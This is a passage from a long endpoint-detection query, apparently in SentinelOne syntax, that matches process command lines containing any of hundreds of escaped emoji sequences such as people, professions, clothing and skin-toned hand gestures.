tgt.process.cmdline contains \"\ud83d\udc77\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\" or tgt.process.cmdline contains \"\ud83d\udc82\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\" or tgt.process.cmdline contains \"\ud83d\udc70\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\" or tgt.process.cmdline contains \"\ud83e\udd35\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\" or tgt.process.cmdline contains \"\ud83e\udec5\" or tgt.process.cmdline contains \"\ud83e\udd34\" or tgt.process.cmdline contains \"\ud83e\udd77\" or tgt.process.cmdline contains \"\ud83e\uddb8\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\" or tgt.process.cmdline contains \"\ud83e\uddb8\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\" or tgt.process.cmdline contains \"\ud83e\uddb9\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\" or tgt.process.cmdline contains \"\ud83e\uddd9\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\" or tgt.process.cmdline contains \"\ud83e\uddd9\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\" or tgt.process.cmdline contains \"\ud83e\udddd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\" or tgt.process.cmdline contains \"\ud83e\udddb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddf\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddf\" or tgt.process.cmdline contains \"\ud83e\udddf\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddde\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddde\" or tgt.process.cmdline contains \"\ud83e\uddde\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\" or tgt.process.cmdline contains \"\ud83e\udddc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\" or tgt.process.cmdline contains \"\ud83e\uddda\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcc\" or tgt.process.cmdline contains \"\ud83d\udc7c\" or tgt.process.cmdline contains \"\ud83e\udd30\" or tgt.process.cmdline contains \"\ud83e\udec4\" or tgt.process.cmdline contains \"\ud83e\udec3\" or tgt.process.cmdline contains \"\ud83e\udd31\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\" or tgt.process.cmdline contains \"\ud83d\ude47\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\" or tgt.process.cmdline contains \"\ud83d\udc81\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\" or tgt.process.cmdline contains \"\ud83d\ude45\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\" or tgt.process.cmdline contains \"\ud83d\ude46\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\" or tgt.process.cmdline contains \"\ud83d\ude4b\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\" or tgt.process.cmdline contains \"\ud83e\uddcf\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\" or tgt.process.cmdline contains \"\ud83e\udd26\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\" or tgt.process.cmdline contains \"\ud83e\udd37\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\" or tgt.process.cmdline contains \"\ud83d\ude4e\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\" or tgt.process.cmdline contains \"\ud83d\ude4d\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\" or tgt.process.cmdline contains \"\ud83d\udc87\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\" or tgt.process.cmdline contains \"\ud83d\udc86\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\" or tgt.process.cmdline contains \"\ud83e\uddd6\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc85\" or tgt.process.cmdline contains \"\ud83d\udc83\" or tgt.process.cmdline contains \"\ud83d\udd7a\" or tgt.process.cmdline contains \"\ud83d\udc6f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6f\" or tgt.process.cmdline contains \"\ud83d\udc6f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd74\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\" or tgt.process.cmdline contains \"\ud83d\udeb6\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\" or tgt.process.cmdline contains \"\ud83e\uddce\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\" or tgt.process.cmdline contains \"\ud83c\udfc3\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\" or tgt.process.cmdline contains \"\ud83e\uddcd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1\" or tgt.process.cmdline contains \"\ud83d\udc6c\" or tgt.process.cmdline contains \"\ud83d\udc6b\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc69\" or tgt.process.cmdline contains \"\ud83d\udc91\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\" or tgt.process.cmdline contains \"\ud83d\udc8f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc6a\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83d\udde3\" or tgt.process.cmdline contains \"\ud83d\udc64\" or tgt.process.cmdline contains \"\ud83d\udc65\" or tgt.process.cmdline contains \"\ud83e\udec2\" or tgt.process.cmdline contains \"\ud83e\uddf3\" or tgt.process.cmdline contains \"\ud83c\udf02\" or tgt.process.cmdline contains \"\u2602\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddf5\" or tgt.process.cmdline contains \"\ud83e\udea1\" or tgt.process.cmdline contains \"\ud83e\udea2\" or tgt.process.cmdline contains \"\ud83e\uddf6\" or tgt.process.cmdline contains \"\ud83d\udc53\" or tgt.process.cmdline contains \"\ud83d\udd76\" or tgt.process.cmdline contains \"\ud83e\udd7d\" or tgt.process.cmdline contains \"\ud83e\udd7c\" or tgt.process.cmdline contains \"\ud83e\uddba\" or tgt.process.cmdline contains \"\ud83d\udc54\" or tgt.process.cmdline contains \"\ud83d\udc55\" or tgt.process.cmdline contains \"\ud83d\udc56\" or tgt.process.cmdline contains \"\ud83e\udde3\" or tgt.process.cmdline contains \"\ud83e\udde4\" or tgt.process.cmdline contains \"\ud83e\udde5\" or tgt.process.cmdline contains \"\ud83e\udde6\" or tgt.process.cmdline contains \"\ud83d\udc57\" or tgt.process.cmdline contains \"\ud83d\udc58\" or tgt.process.cmdline contains \"\ud83e\udd7b\" or tgt.process.cmdline contains \"\ud83e\ude74\" or tgt.process.cmdline contains \"\ud83e\ude71\" or tgt.process.cmdline contains \"\ud83e\ude72\" or tgt.process.cmdline contains \"\ud83e\ude73\" or tgt.process.cmdline contains \"\ud83d\udc59\" or tgt.process.cmdline contains \"\ud83d\udc5a\" or tgt.process.cmdline contains \"\ud83d\udc5b\" or tgt.process.cmdline contains \"\ud83d\udc5c\" or tgt.process.cmdline contains \"\ud83d\udc5d\" or tgt.process.cmdline contains \"\ud83c\udf92\" or tgt.process.cmdline contains \"\ud83d\udc5e\" or tgt.process.cmdline contains \"\ud83d\udc5f\" or tgt.process.cmdline contains \"\ud83e\udd7e\" or tgt.process.cmdline contains \"\ud83e\udd7f\" or tgt.process.cmdline contains \"\ud83d\udc60\" or tgt.process.cmdline contains \"\ud83d\udc61\" or tgt.process.cmdline contains \"\ud83e\ude70\" or tgt.process.cmdline contains \"\ud83d\udc62\" or tgt.process.cmdline contains \"\ud83d\udc51\" or tgt.process.cmdline contains \"\ud83d\udc52\" or tgt.process.cmdline contains \"\ud83c\udfa9\" or tgt.process.cmdline contains \"\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\udde2\" or tgt.process.cmdline contains \"\u26d1\" or tgt.process.cmdline contains \"\ud83e\ude96\" or tgt.process.cmdline contains \"\ud83d\udc84\" or tgt.process.cmdline contains \"\ud83d\udc8d\" or tgt.process.cmdline contains \"\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffb\" or tgt.process.cmdline contains \"\u270b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffb\" or tgt.process.cmdline contains \"\u270c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffb\" or tgt.process.cmdline contains \"\u261d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffb\" or tgt.process.cmdline contains \"\u270a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffb\" or tgt.process.cmdline contains \"\u270d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude92\" or 